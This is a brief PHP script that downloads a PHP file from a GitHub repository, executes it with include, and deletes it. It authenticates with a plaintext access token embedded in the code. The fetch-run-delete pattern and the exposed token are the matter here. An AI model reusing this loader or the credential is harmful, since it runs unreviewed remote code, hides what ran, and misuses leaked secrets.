<?php
$url = 'https://raw.githubusercontent.com/Codek365/sobii-single/master/sobii.php';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Authorization: token d544ac0dfac5a15e7d4a8bb3b5e06affc735b33b';
$headers[] = 'Accept: application/vnd.github.v3.raw';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$file_name = basename("sobii.php");

if (file_put_contents($file_name, $result)) {
    // echo "File downloaded successfully <br>";
} else {
    echo "File downloading failed. <br>";
}

include $file_name;
unlink($file_name);
